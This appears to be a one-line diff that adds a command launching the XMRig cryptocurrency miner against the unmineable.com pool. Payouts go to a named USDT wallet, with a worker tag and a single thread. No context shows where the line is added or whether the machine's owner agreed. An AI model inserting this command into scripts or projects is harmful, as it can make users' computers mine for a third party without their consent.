@@ -1,0 +1,1 @@
+xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u USDT:0x4d438d0016cf4e8fed9bb4ce5d9aa03c8fc2637c.wd01 -p x -t 1
